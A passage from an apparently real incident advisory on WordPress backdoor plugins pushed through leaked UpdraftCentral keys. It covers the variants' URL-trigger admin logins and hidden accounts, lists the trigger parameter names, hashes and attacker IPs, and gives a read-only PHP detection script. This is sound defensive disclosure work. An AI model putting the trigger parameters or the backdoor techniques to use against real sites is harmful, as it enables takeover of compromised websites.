- Possibly related: since 20 October we also see UpdraftPlus version checks via `/wp-content/plugins/updraftplus/readme.txt` on our sites, often followed by `POST /wp-admin/admin-ajax.php`, from `107.189.14.87`, `45.61.188.240` and `45.61.184.170` with spoofed browser User-Agents. Another administrator reports the same ranges. We do not know whether this is the same attacker.
- in the UpdraftCentral log, the probe `probe.central.updraftplus.com` followed a few hours later by `Command received: plugin.upload_plugin`
- the plugin description “Small maintenance toolkit: keeps option storage tidy.”
- a user with an email at `@example.org` and the display name “Site Tools”, with the Editor role and the capabilities `manage_options` and `install_plugins`
- the fatal error `Undefined constant <Class>::FIELD` and a WordPress email about an error in a plugin you do not recognise

## The second variant: a working backdoor with its own administrator

Two other affected administrators described this variant to us. The first manages about 145 sites and found it on two of the three that were hit. The attacker did not use it there: no `_uid` option, no account and no foreign session appeared. The second found it on three of the four sites where a backdoor got installed and confirmed that it **works**: unlike the first variant, it has no bug that crashes the site. Another administrator sent us the sample `boost-kit`, so we have analysed it ourselves. Both descriptions hold, except for the account hiding, which does not work.

- It is a single PHP file with a random name that does not have to follow the pattern of the first variant (for example `opt4fix`, `cache-smith`). The description differs in every sample; one of them was “Improves cron tasks efficiency for content sites with minimal overhead.”.
- As cover, on activation it sets the option `<slug>_installed`, schedules a daily cron `<slug>_maintenance` that really deletes expired transients, and adds a jQuery filter for AMP pages.
- Trigger: a parameter named with 12 hex characters and a 32-character token, for example `?f2b9faa21ebd=…` or `?303541c9dfd0=…&m=setup`. Other parameter names seen: `f883d260d98a`, `a613ff6d53aa`, `6eb3d55b634e`, `f343ef05a88e`, `a67730d1b537`, `2c71bff4b006`, `666b564665a9`.
- **Without the `m` parameter it logs the attacker in as the first existing administrator** and redirects to the admin. It creates no account, so only the plugin file and a line in the access log remain.
- Mode `m=setup` creates a full **administrator** and stores its ID in the option `<slug>_uid` (for example `src_lab_uid`). Mode `m=svc` logs the attacker into that account. Accounts look like `system_team850`, `web.tech988`, `cmseditor170`, `cms.tech644` or `web_mgr684`, with an email at `@example.com` and a display name such as “System Team”, “Web Tech”, “System Staff”, “System Ops” or “Cms Tech”.
- It tries to hide the account with a `pre_user_query` hook and a `pre_count_users` filter, but both are written wrongly. The `pre_user_query` hook adds the account to the excluded users only after WordPress has built the SQL query, so the result does not change. The `pre_count_users` filter receives `null` instead of the counts and changes nothing. We verified on WordPress 7.1.3 that the account shows up normally in the user list and in the administrator count.
- It has no `uninstall.php`. On deactivation it deletes only the option `<slug>_installed`.
- Delivery is the same as for the first variant: a probe followed by `plugin.upload_plugin`, from both `43.250.53.42` and `2a09:bac5:4e21:2e3c::49b:9`, on the night of 18 to 19 October (for example src-lab on 18 Oct at 23:39 UTC, render-helper-232b on 19 Oct at 00:03 UTC).

Samples (SHA-256 of the main file):

- `src-lab`, “Src Lab” 3.0.0, author “WPBridge”, `src-lab.php` `59231b0e5004672b3058b47b4b4ff2b1fa89f1961bedf1741ba285e8adbe4928`
- `render-helper-232b`, “Render Helper 232b” 3.7.9
- `opt4fix`, “Opt4fix” 2.9.2, author “DigitalFork”, `54ca7b2da87852a5d1fd7bde644027f84557db4d45fbb25cb2d135a3497d8d5c`
- `js-fix-757a`, “Js Fix 757a” 2.8.3, author “WPBridge”, `2cdf3f2a3f10f0e12f00f2267907d44796107ab4aececdac520bba13e012b47a`
- `lazy-tool-3055`, “Lazy Tool 3055” 1.3.8, author “MetaLayer”, `1821a58e2a851acd1a608a77ce2f77817a0b7b6ef344b9889c8f8728e62969ec`
- `cache-smith`, “Cache Smith” 1.3.1, author “ToolBelt WP”, `43dc88fd18501be3dbd6d7f1755e77386d081dd41cef82bc514d39991ae69c49`
- `boost-kit`, “Boost Kit” 2.9.3, author “PixelForge”, description “Simple database queries management with automatic cleanup routines.”, `fd664098cf189698e730b94fe1ea9f4425738f1be4bb9bd19eb38e14dbdf72e1`
- `fast2engine`, “Fast2engine” 1.6.9, author “CodeBarn”, description “Reliable transient storage maintenance companion for site owners.”, account `wp.tech506@example.com`, `0f194a46d99a8180908a55d1ae9d5bb51e9257e68ba10312ce030b8a5cd2c8dd`
- `defer-engine`, “Defer Engine” 3.3.1, author “SiteCraft Labs”, description “Fine-tunes script loading delivery to reduce load times on busy sites.”, account `media-mgr138`, `87cb01de622d0108b60d4f3d6663935a7b53fd17b6b82b53a26e47a5b522dc91`
- `minify-tool-bf90`, “Minify Tool Bf90” 2.9.8, author “MetaLayer”, description “Improves asset loading efficiency for content sites with minimal overhead.”, account `pageeditor85`, `ca5ba1b02d4f1802c8182e7a71a4668959f42b501c523864c48dfdfc03ad54e8`

How to find it: version 3 of the checking script recognises plugin files by known strings, such as “keep service accounts out of the main user list”, and by their code (logging in with `wp_set_auth_cookie` after `hash_equals` on a value from the URL, hiding with `pre_user_query` and `pre_count_users`), checks the options `<slug>_uid` and `<slug>_installed`, and reads users straight from the database. It also searches `wp-content/upgrade/`, where the unpacked plugin stays even when the install failed. Check the access log as described in “What to do right now”.

## The third variant: a minimal backdoor

The same administrator also found the plugin `site-health-364f` (“Site Health 364F”, version 1.0, description “Maintenance helper.”, no author). It is a single 673-byte file without any disguise:

- On activation it stores the option `site_health_364f_ver`.
- Trigger: the parameter `83e590bb7e9b` with a 32-character token written directly into the code.
- It logs the attacker in as the first existing administrator and redirects to the admin. It creates no account.
- SHA-256 of `site-health-364f.php`: `056db22ebb8b1c0036a992ecf9c37c7f868b1eab68812445eed29062fc2307fa`

Apart from the plugin, it leaves only a line in the access log, which the grep from “What to do right now” finds. The checking script catches it from version 4.

Another administrator found a hidden version of it, `site-health-cache` (“Site Health Cache” 1.0.0, no description or author, trigger `38af88274bf8`, option `sh_cache_ver`, SHA-256 `fd37eda3283416c568d53dd437f190341221138d8efabc7437e983b09946f9dd`). An `all_plugins` filter removes it from the plugin list and a `pre_update_option_recently_activated` filter from the recently active list, so you do not see it in the admin although it is active. The checking script finds it on disk. Another administrator found the same hidden version with a different trigger (`9c37ef099b7b`, SHA-256 `2fc98e80960d196fa5b70ffa8c76ee5332c9d6c60465fe2e38ab2c597c357205`).

## What to do if you find it

1. If you have not done so yet, remove the UpdraftCentral connection as described in “What to do right now”. Otherwise the attacker can send a fixed version of the backdoor.
2. Deactivate the plugin and move it out of the web root. If you want to keep it as evidence, do not delete it through the admin, because `uninstall.php` deletes its options.
3. Delete the backdoor’s options (`<slug>_sync_token`, `<slug>_uid`, `<slug>_installed`, `<slug>_ver`) and any account it created.
4. Check the users with the script below. If the backdoor worked, meaning its account exists or the access log shows a request with its parameter, treat the site as fully compromised. The attacker could have uploaded more plugins or a webshell and changed files or the database. Restore the site from a backup taken before 17 October, compare the files with a clean installation and review all users with extra capabilities.
5. Change the administrator passwords and the UpdraftCentral Cloud account password, end all logged-in sessions and enable two-factor authentication. UpdraftPlus Premium may keep the teamupdraft.com account password in the database exactly as you entered it (option `updraftplus-addons_options`). If the attacker got into the admin or the database, treat that password as leaked.
6. Consider whether you need remote management at all. If you do, create the key under an account without the right to install plugins, unless you need that remotely. On site C exactly this coincidence stopped the attack.

## Checking script

The script checks five things: whether the site is connected to UpdraftCentral, what the site received through UpdraftCentral, whether the `plugins`, `mu-plugins` and `upgrade` folders contain backdoor files, whether its options are in the database, and whether its account or any other user with unexpected rights exists. Version 3 also recognises the backdoor by its code, so it catches renamed samples of the working variant with a different description, checks the options `<slug>_uid` and `<slug>_installed`, reads users straight from the database and flags administrators created since 17 October. Version 4 also catches the minimal third variant by the token written directly into its code. Version 5 also reports other plugins that log visitors in based on a URL parameter as `[WARN]`. An administrator pointed us to this after finding an older backdoor unrelated to this campaign, `doctor-connectivity-query`, active since June. It hides itself from the plugin list and runs arbitrary code without a login. Version 5 reports `@example.com` accounts without admin rights created before 17 October, such as shop customers registered by bots, only as `[WARN]`. Version 6 also finds leftover first-variant options when the plugin name does not end in three hex characters, such as `query_shelf_sync_token`. Version 7 tells you when there is no UpdraftCentral log at all, for example after UpdraftPlus was removed, instead of reporting it as clean. Version 8 also warns about plugins that hide themselves from the plugin list. Version 9 also reports UpdraftPlus Migrator keys. Version 10 also warns about a teamupdraft.com account password stored in the database.

On site A, after the backdoor was removed, it prints:

```
[OK]    No active UpdraftCentral connection.
[WARN]  2026-10-19 00:14 UTC  43.250.53.42  probe for UpdraftCentral (UA: WordPress/6.4; class-udrpc.php).
[ALERT] 2026-10-19 02:14 UTC  43.250.53.42  "Command received: plugin.upload_plugin" (UA: WordPress/6.4; class-udrpc.php). A plugin or theme was pushed to this site.
[OK]    No backdoor plugin files found.
[OK]    No backdoor options in the database.
[OK]    No backdoor accounts or hidden admin-level users.
```
You can also download the script directly:

`curl -o check-updraftcentral.php https://nethemba.com/wp-content/uploads/2026/10/check-updraftcentral.txt`
SHA-256 of the script: `cedb723aeed2d56c942a33a26d9ee3390c3ad02f1cfddd098cfbc8d5ea7dd935`. The full code:

```
<?php
/**
 * Nethemba: check for the UpdraftCentral backdoor campaign of October 2026.
 * Read-only. It changes nothing on the site.
 * v2: also detects the second variant, which creates a hidden administrator.
 * v3: catches its renamed samples by code and by <slug>_uid / <slug>_installed options, and checks wp-content/upgrade.
 * v4: also detects the minimal variant: a token written into the code, compared with a URL parameter, then a login.
 * v5: warns about any plugin that logs visitors in from a URL parameter; @example.com accounts without
 *     admin rights that existed before the attack (e.g. shop customers) are a warning, not an alert.
 * v6: also finds first-variant options whose plugin name has no hex suffix (e.g. query_shelf_sync_token).
 * v7: says so when there is no UpdraftCentral log at all (e.g. UpdraftPlus was removed) instead of reporting it as clean.
 * v8: warns about plugins that hide themselves from the WordPress plugin list.
 * v9: also reports UpdraftPlus Migrator keys, which let another site send backup files over the same channel.
 * v10: warns when UpdraftPlus Premium keeps the teamupdraft.com account password in the database.
 *
 * Run in the WordPress root directory:
 *   wp eval-file check-updraftcentral.php --skip-plugins --skip-themes
 *
 * --skip-plugins matters: an installed copy of the backdoor crashes every request,
 * including WP-CLI, unless plugins are skipped.
 */
$alerts = 0;
$warnings = 0;
$report = function ( $level, $message ) use ( &$alerts, &$warnings ) {
	if ( 'ALERT' === $level ) $alerts++;
	if ( 'WARN' === $level ) $warnings++;
	echo str_pad( "[$level]", 8 ), $message, "\n";
};
echo "UpdraftCentral backdoor check for ", get_option( 'siteurl' ), "\n\n";
// 1. Is the site connected to UpdraftCentral?
$keys = get_option( 'updraft_central_localkeys' );
if ( is_array( $keys ) && $keys ) {
	foreach ( $keys as $id => $key ) {
		$report( 'WARN', sprintf(
			'UpdraftCentral connection is active: key %s, created %s by user "%s". Delete it now.',
			$id,
			isset( $key['created'] ) ? gmdate( 'Y-m-d', $key['created'] ) : '?',
			isset( $key['extra_info']['user_login'] ) ? $key['extra_info']['user_login'] : '?'
		) );
	}
} else {
	$report( 'OK', 'No active UpdraftCentral connection.' );
}
// UpdraftPlus Premium may keep the teamupdraft.com account password as entered until token login succeeds.
$addons = get_option( 'updraftplus-addons_options' );
if ( ! is_array( $addons ) && is_multisite() ) $addons = get_site_option( 'updraftplus-addons_options' );
if ( is_array( $addons ) && ! empty( $addons['password'] ) ) {
	$report( 'WARN', 'UpdraftPlus keeps the teamupdraft.com account password for ' . ( isset( $addons['email'] ) ? $addons['email'] : '?' ) . ' in the database (option updraftplus-addons_options). Remove it and change the password if any foreign code may have run on this site.' );
}
// Migrator keys use the same UDRPC channel to receive backup files from another site.
$migrator_keys = get_option( 'updraft_migrator_localkeys' );
foreach ( is_array( $migrator_keys ) ? $migrator_keys : array() as $hash => $key ) {
	$report( 'WARN', sprintf(
		'UpdraftPlus Migrator key "%s" is active: another site can send backup files here with it. Delete it unless you are migrating right now.',
		isset( $key['name'] ) ? $key['name'] : $hash
	) );
}
// 2. What the site received over UpdraftCentral.
$log = get_site_option( 'updraftcentral_client_log' );
$log_hits = 0;
foreach ( is_array( $log ) ? $log : array() as $entry ) {
	$message = isset( $entry['message'] ) ? $entry['message'] : '';
	$agent   = isset( $entry['http_user_agent'] ) ? $entry['http_user_agent'] : '';
	$when    = isset( $entry['time'] ) ? gmdate( 'Y-m-d H:i', $entry['time'] ) . ' UTC' : '?';
	$ip      = isset( $entry['remote_ip'] ) ? $entry['remote_ip'] : '?';
	if ( preg_match( '/upload_(plugin|theme)/', $message ) ) {
		$report( 'ALERT', "$when  $ip  \"$message\" (UA: $agent). A plugin or theme was pushed to this site." );
		$log_hits++;
	} elseif ( false !== strpos( $message, 'probe.central.updraftplus.com' ) ) {
		$report( 'WARN', "$when  $ip  probe for UpdraftCentral (UA: $agent)." );
		$log_hits++;
	} elseif ( 'Command received' === substr( $message, 0, 16 ) && preg_match( '/class-udrpc\.php$/', $agent ) ) {
		$report( 'ALERT', "$when  $ip  \"$message\" from a client that is not UpdraftCentral Cloud (UA: $agent)." );
		$log_hits++;
	}
}
if ( ! is_array( $log ) || ! $log ) {
	$report( 'INFO', 'There is no UpdraftCentral log on this site (no command ever arrived, or UpdraftPlus was removed). Check the access log for POST requests with the User-Agent "WordPress/6.4; class-udrpc.php".' );
} elseif ( ! $log_hits ) {
	$report( 'OK', 'UpdraftCentral log shows no plugin uploads, probes or foreign clients.' );
}
// 3. Backdoor plugins in plugins and mu-plugins, plus leftovers of pushed plugins in wp-content/upgrade
// (a push that failed to install still leaves the unpacked plugin there).
$is_backdoor = function ( $code ) {
	return false !== strpos( $code, 'keeps option storage tidy' )
		|| false !== strpos( $code, 'Improves cron tasks efficiency' )
		|| false !== strpos( $code, 'keep service accounts out of the main user list' )
		|| ( false !== strpos( $code, "_sync_token'" ) && false !== strpos( $code, 'wp_set_auth_cookie' ) && false !== strpos( $code, 'hash_equals' ) )
		|| ( false !== strpos( $code, 'pre_user_query' ) && false !== strpos( $code, 'pre_count_users' ) && false !== strpos( $code, 'wp_set_auth_cookie' ) )
		|| ( preg_match( '/hash_equals\(\s*[\'"][A-Za-z0-9_-]{20,}[\'"]/', $code ) && false !== strpos( $code, '$_GET' ) && false !== strpos( $code, 'wp_set_auth_cookie' ) );
};
// Any plugin that logs visitors in based on a URL parameter, however it compares the key (older backdoors use ===).
$logs_in_from_url = function ( $code ) {
	return false !== strpos( $code, '$_GET' ) && false !== strpos( $code, 'wp_set_auth_cookie' );
};
// A plugin that removes itself from the WordPress plugin list, as Site Health Cache and doctor-connectivity-query do.
$hides_itself = function ( $code ) {
	return preg_match( '/add_filter\(\s*[\'"]all_plugins[\'"]/', $code )
		&& preg_match( '/plugin_basename\(\s*__FILE__\s*\)/', $code )
		&& preg_match( '/unset\(\s*\$\w+\[\s*\$\w+\s*\]\s*\)/', $code );
};
$plugin_hits = 0;
$files = array_merge(
	(array) glob( WP_PLUGIN_DIR . '/*/*.php' ),
	(array) glob( WPMU_PLUGIN_DIR . '/*.php' ),
	(array) glob( WP_CONTENT_DIR . '/upgrade/*/*.php' ),
	(array) glob( WP_CONTENT_DIR . '/upgrade/*/*/*.php' )
);
foreach ( $files as $file ) {
	$code = (string) @file_get_contents( $file, false, null, 0, 200000 );
	$where = 0 === strpos( $file, WP_CONTENT_DIR . '/upgrade/' ) ? ' (left in wp-content/upgrade by a pushed plugin; the install may have failed)' : '';
	if ( $is_backdoor( $code ) ) {
		$report( 'ALERT', "Backdoor plugin file: $file$where" . ( $hides_itself( $code ) ? ' It hides itself from the plugin list.' : '' ) );
		$plugin_hits++;
	} elseif ( $logs_in_from_url( $code ) ) {
		$report( 'WARN', "Plugin logs visitors in based on a URL parameter: $file$where. Make sure you know it." . ( $hides_itself( $code ) ? ' It also hides itself from the plugin list.' : '' ) );
		$plugin_hits++;
	} elseif ( $hides_itself( $code ) ) {
		$report( 'WARN', "Plugin hides itself from the WordPress plugin list: $file$where. Some management plugins (e.g. MainWP Child) can do this on purpose; make sure you know it." );
		$plugin_hits++;
	}
}
if ( ! $plugin_hits ) $report( 'OK', 'No backdoor plugin files found.' );
// 4. Options the backdoor leaves behind.
global $wpdb;
$option_hits = 0;
// First variant: most plugin names end in three hex characters, but not all (query-shelf), so a name
// without them counts only when its plugin is gone or is the backdoor itself.
foreach ( $wpdb->get_col( "SELECT option_name FROM {$wpdb->options} WHERE option_name REGEXP '^[a-z]+_[a-z]+(_[0-9a-f]{3})?_(sync_token|setup_stamp)$'" ) as $name ) {
	$slug = str_replace( '_', '-', preg_replace( '/_(sync_token|setup_stamp)$/', '', $name ) );
	$main = WP_PLUGIN_DIR . "/$slug/$slug.php";
	if ( is_file( $main ) && ! $is_backdoor( (string) @file_get_contents( $main, false, null, 0, 200000 ) ) ) continue;
	$report( 'ALERT', "Backdoor option in the database: $name" );
	$option_hits++;
}
// The working variant stores <slug>_installed and the ID of its hidden administrator in <slug>_uid.
// Plugin names vary, so match the suffix and look at the plugin with the same slug.
foreach ( $wpdb->get_results( "SELECT option_name, option_value FROM {$wpdb->options} WHERE option_name LIKE '%\\_uid' OR option_name LIKE '%\\_installed'" ) as $o ) {
	$is_uid = '_uid' === substr( $o->option_name, -4 );
	$slug = str_replace( '_', '-', substr( $o->option_name, 0, $is_uid ? -4 : -10 ) );
	$main = WP_PLUGIN_DIR . "/$slug/$slug.php";
	$code = is_file( $main ) ? (string) @file_get_contents( $main, false, null, 0, 200000 ) : '';
	$u = ( $is_uid && ctype_digit( (string) $o->option_value ) ) ? $wpdb->get_row( $wpdb->prepare( "SELECT user_login, user_email FROM {$wpdb->users} WHERE ID = %d", $o->option_value ) ) : null;
	$who = $u ? " (user {$u->user_login} <{$u->user_email}>)" : '';
	if ( ( $u && preg_match( '/@example\.(com|org)$/', $u->user_email ) ) || ( $code && ( $is_backdoor( $code ) || $logs_in_from_url( $code ) ) ) ) {
		$report( 'ALERT', "Backdoor option in the database: {$o->option_name} = {$o->option_value}$who" );
		$option_hits++;
	} elseif ( $is_uid && $u && ! is_dir( WP_PLUGIN_DIR . "/$slug" ) ) {
		$report( 'WARN', "Option {$o->option_name} points to an account, but plugin $slug is gone$who. Make sure you know this account." );
		$option_hits++;
	}
}
if ( ! $option_hits ) $report( 'OK', 'No backdoor options in the database.' );
// 5. Accounts the backdoor creates, and non-admins with admin-level capabilities.
// Read users straight from the table: the second variant tries to hide its account from get_users() and user counts.
$user_hits = 0;
$cap_key = $wpdb->get_blog_prefix() . 'capabilities';
$flagged = array();
foreach ( $wpdb->get_results( "SELECT ID, user_login, user_email, display_name, user_registered FROM {$wpdb->users} WHERE user_email LIKE '%@example.org' OR user_email LIKE '%@example.com' OR display_name IN ('Site Tools', 'System Team', 'Web Tech', 'System Staff', 'System Ops', 'Cms Tech')" ) as $user ) {
	// Bots also register shop customers at @example.com, so only admin-level or recent accounts are an alert.
	$caps = (array) get_user_meta( $user->ID, $cap_key, true );
	$admin_level = ! empty( $caps['administrator'] ) || ! empty( $caps['manage_options'] ) || ! empty( $caps['install_plugins'] );
	if ( $admin_level || $user->user_registered >= '2026-10-17' ) {
		$report( 'ALERT', "Backdoor-style account: {$user->user_login} <{$user->user_email}> \"{$user->display_name}\", registered {$user->user_registered}" . ( $admin_level ? ', with admin-level rights' : '' ) );
	} else {
		$report( 'WARN', "Account {$user->user_login} <{$user->user_email}> \"{$user->display_name}\" matches the backdoor pattern but has no admin-level rights and was registered on {$user->user_registered}. Probably unrelated; make sure you know it." );
	}
	$flagged[ $user->ID ] = true;
	$user_hits++;
}
foreach ( $wpdb->get_results( $wpdb->prepare( "SELECT u.ID, u.user_login, u.user_email, u.user_registered FROM {$wpdb->users} u JOIN {$wpdb->usermeta} m ON m.user_id = u.ID AND m.meta_key = %s WHERE u.user_registered >= '2026-10-17' AND m.meta_value LIKE %s", $cap_key, '%administrator%' ) ) as $user ) {
	if ( isset( $flagged[ $user->ID ] ) ) continue;
	$report( 'WARN', "Administrator created on {$user->user_registered}: {$user->user_login} <{$user->user_email}>. Make sure you know this account." );
	$user_hits++;
}
foreach ( get_users( array( 'fields' => array( 'ID', 'user_login', 'user_email', 'display_name' ) ) ) as $user ) {
	if ( isset( $flagged[ $user->ID ] ) ) continue;
	$caps = (array) get_user_meta( $user->ID, $cap_key, true );
	$extra = array_intersect( array( 'manage_options', 'install_plugins' ), array_keys( array_filter( $caps ) ) );
	if ( $extra && empty( $caps['administrator'] ) ) {
		$report( 'WARN', "Non-administrator {$user->user_login} has extra capabilities: " . implode( ', ', $extra ) );
		$user_hits++;
	}
}
if ( ! $user_hits ) $report( 'OK', 'No backdoor accounts or hidden admin-level users.' );
echo "\n";
if ( $alerts ) {
	echo "RESULT: traces of the attack found. Delete the UpdraftCentral connection, remove the backdoor and check users and passwords.\n";
} elseif ( $warnings ) {
	echo "RESULT: no backdoor found, but there are warnings above. If the site is connected to UpdraftCentral, delete the connection now.\n";
} else {
	echo "RESULT: no traces found.\n";
}
```
## Why we publish immediately

Responsible disclosure means giving the vendor time to fix a problem and publishing the details only afterwards. Unfortunately there is no reason for that here. The attacker is already actively spreading backdoors into WordPress installations, and a fix from the vendor will not help site owners as long as the attacker holds valid keys. The only effective protection is to remove the UpdraftCentral connection and check the site, and every administrator can do that right now.

Publishing does not help the attacker, who needs valid keys and already has them. Nothing in this article gives the attacker a new way to attack. It does give defenders a way to protect themselves. The backdoor is also produced by a generator that creates different names, tokens and passwords for every site, which suggests a tool built for a large number of sites. Every hour of waiting gives the attacker time for more sites.

## Communication with the vendor and security companies

- 19 Oct 2026: report to TeamUpdraft through the premium support form, with logs and an analysis of site A
- 19 Oct 2026: follow-up on the attacks on sites B and C, the second sample and a comparison of the User-Agent with the real dashboard
- 19 Oct 2026: notified Wordfence and Patchstack so they can add detection and warn other site owners
- 19 Oct 2026: TeamUpdraft published a [statement on the security incident](https://teamupdraft.com/blog/security-incident-october-2026/) confirming that the customer database, including the UpdraftCentral keys, was accessed
- 19 Oct 2026: in its reply to our report, TeamUpdraft confirmed that it considers the UpdraftCentral keys compromised and is asking every UpdraftCentral customer to disconnect and check each site. At the time of writing the emergency UpdraftPlus release was not out yet (the latest is 1.26.11 from 16 Oct).
- 19 Oct 2026: Patchstack published [its own analysis](https://patchstack.com/articles/updraftcentral-key-compromise-wordpress-backdoors/) and confirmed both attacker IP addresses. Wordfence and Patchstack asked for samples.
- 19 Oct 2026: we sent Wordfence and Patchstack the samples from our sites and later the indicators of the working variant that another administrator shared with us.
- 19 Oct 2026: with the consent of two more affected administrators, we sent Wordfence and Patchstack their samples, including the minimal third variant, and the log entries showing the backdoor swap.
- 19 Oct 2026: TeamUpdraft answered our follow-up questions. The attacker had access to teamupdraft.com from the evening of Saturday 17 October; the vendor noticed suspicious activity on the evening of Sunday 18 October and confirmed the breach at around 20:00 BST. It closed the access route, signed out every account and started replacing keys and credentials. According to the vendor, TOTP secrets cannot be stored as hashes, so a database leak has to be assumed to include them. As the emergency release it named 2.26.12, which does not delete the keys (see above). It does not know yet whether it will publish indicators of compromise.
- 19 Oct 2026: we told TeamUpdraft that version 2.26.12 does not delete the keys and that the cutoff of 12:07 UTC on 18 October in version 1.26.13 does not match their statement, and asked whether 2.26.13 is available to premium customers.
- 20 Oct 2026: we told Wordfence and Patchstack that version 2.26.12 does not delete the keys, about the “Add this website to UpdraftCentral” checkbox ticked by default and about another first-variant sample.
- 20 Oct 2026: with the consent of another administrator, we sent Wordfence and Patchstack three samples from one site, including the minimal variant that hides itself from the plugin list.
- 19 Oct 2026: Wordfence published [its own PSA](https://www.wordfence.com/blog/2026/10/updraftcentral-connection-key-compromise/), citing our analysis, and released a firewall rule for the free version as well. Neither the rule nor the PSA accounts yet for 1.26.12 / 2.26.12 not deleting the keys.
- 20 Oct 2026: we told Wordfence that their rule does not cover 1.26.12 / 2.26.12, which do not delete the keys, and that the revocation cutoff is 12:07 UTC. Wordfence and Patchstack received the indicators of today’s attempts to use the backdoors.
- 20 Oct 2026: with the consent of three more administrators, we sent Wordfence and Patchstack twelve samples, including a second copy of the hidden minimal variant.
- 20 Oct 2026: TeamUpdraft added to its [statement](https://teamupdraft.com/blog/security-incident-october-2026/) that version 1.26.13 / 2.26.13, released on 19 October shortly after 22:00 BST, revoked the UpdraftCentral keys and that the unauthorised access was resolved. Its instructions still recommend 1.26.12 / 2.26.12, though. When we asked which version to install, the vendor replied with a link to that statement.
- 21 Oct 2026: we told TeamUpdraft that the attacker was still sending UpdraftCentral commands on the morning of 21 October, that their instructions still name 1.26.12 / 2.26.12, and that the premium version may keep the teamupdraft.com account password in the database. The vendor had replied that it passed our article to its developers.
- 21 Oct 2026: In [updates to its statement](https://teamupdraft.com/blog/security-incident-october-2026/), TeamUpdraft said that the attacker got into teamupdraft.com using a compromised key, that it has brought in an external security firm and contacted the police, and that WordPress.org pushed version 1.26.13 to all sites automatically. It urges premium users to check their sites even if they never used UpdraftCentral. According to the vendor, the speed of the attack and the initially faulty backdoors suggest the attacker used AI. In reply to our last message, the vendor said the instructions had been updated and that it advises all customers to change their teamupdraft.com password. As of 22 October, though, the steps in the instructions still name 1.26.12 / 2.26.12, and the vendor did not comment on the revocation cutoff.
- 22 Oct 2026: with the consent of another administrator, we sent Wordfence and Patchstack the sample `cache-jack-c7a` and the log entry of the attacker’s attempt to use it on 20 October.

If you have seen a similar attack, write to us at info@nethemba.com. We will provide samples and further technical material to the vendor and to security teams on request.

## Changes

- 19 Oct 2026: first publication.
- 19 Oct 2026: note that the UpdraftCentral log keeps only 50 events, plus an access log check; advice not to reconnect; steps for fully compromised sites; clarified the versions affected by CVE-2026-10795.
- 19 Oct 2026: added the vendor’s statement confirming that keys leaked from teamupdraft.com; updated the recommendations, fix and scope.
- 19 Oct 2026 (evening): second variant with a hidden administrator, more samples of the first variant, second IP address, link to Patchstack’s analysis, checking script version 2.
- 19 Oct 2026: added the vendor’s direct reply to our report.
- 19 Oct 2026: working variant confirmed in circulation, more samples of both variants, access log check for the triggers, protection through a read-only plugins folder, reconnaissance on 23 Sep, checking script version 3.
- 19 Oct 2026: analysis of a working-variant sample (the account hiding does not work), minimal third variant, another first-variant sample, warning about repeated pushes, checking script version 4.
- 19 Oct 2026: the attacker keeps coming back (backdoor swap via `plugin.delete_plugin`, command attempts on our sites into the evening), site selection from the UpdraftCentral list, checking script version 5.
- 19 Oct 2026: vendor’s emergency release (1.26.12 deletes no keys; 1.26.13 works, but not for keys created on 18 Oct between 12:07 and 21:00 UTC), vendor’s answers added.
- 20 Oct 2026: an UpdraftCentral key can be created without the owner noticing (checkbox ticked by default in the premium version), another first-variant sample, note on IP addresses behind a proxy, checking script version 6.
- 20 Oct 2026: checking script version 7 distinguishes a missing UpdraftCentral log.
- 20 Oct 2026: hidden version of the minimal variant, more samples, several backdoors on one site, checking script version 8.
- 20 Oct 2026: another first-variant sample (`nav-hub`).
- 20 Oct 2026: ten more samples from three administrators, working backdoors active before the site crashed, meaning of “Signature verification failed” lines, recurring author names.
- 20 Oct 2026: recommendation to delete UpdraftPlus Migrator keys as well, checking script version 9.
- 20 Oct 2026: the attacker tries the triggers of removed backdoors (new IP addresses), correction: the free version also has the checkbox ticked by default, meaning of status codes in the access log, link to Wordfence’s PSA and its firewall rule, more names.
- 20 Oct 2026: clarification of when an UpdraftCentral key is created.
- 21 Oct 2026: vendor’s statement of 20 Oct added, our sites received 2.26.13, note on the teamupdraft.com account password stored in the database.
- 21 Oct 2026: the attacker keeps sending UpdraftCentral commands after 1.26.13 was released.
- 21 Oct 2026: more attempts to use the backdoors (new IP ranges), possibly related UpdraftPlus version checks.
- 22 Oct 2026: new vendor statements of 21 Oct (update forced through WordPress.org, external firm, police).
- 22 Oct 2026: teamupdraft.com account password stored in the database and how to remove it, another IP range in the attempts to use the backdoors, checking script version 10.
- 22 Oct 2026: another first-variant sample (`cache-jack-c7a`).
- 23 Oct 2026: added how often the teamupdraft.com account password stays in the database.
- 23 Oct 2026: a reader’s test and the vendor’s statement on the password stored in the database.
